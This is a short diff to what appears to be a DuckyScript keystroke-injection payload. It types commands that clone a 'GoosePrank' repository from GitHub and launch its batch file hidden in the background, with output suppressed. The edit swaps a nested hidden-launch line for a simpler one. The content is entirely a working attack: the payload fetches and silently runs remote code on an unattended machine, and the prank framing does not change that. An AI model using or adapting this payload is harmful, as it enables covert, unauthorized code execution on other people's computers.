@@ -15,7 +15,8 @@ ENTER
 STRING git clone https://github.com/Deadverse/GoosePrank.git .
 ENTER
 DELAY 7500
-STRING START /B %COMSPEC% /K START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
+REM STRING START /B %COMSPEC% /K START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
+STRING START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
 ENTER
 DELAY 2000
 STRING exit /b
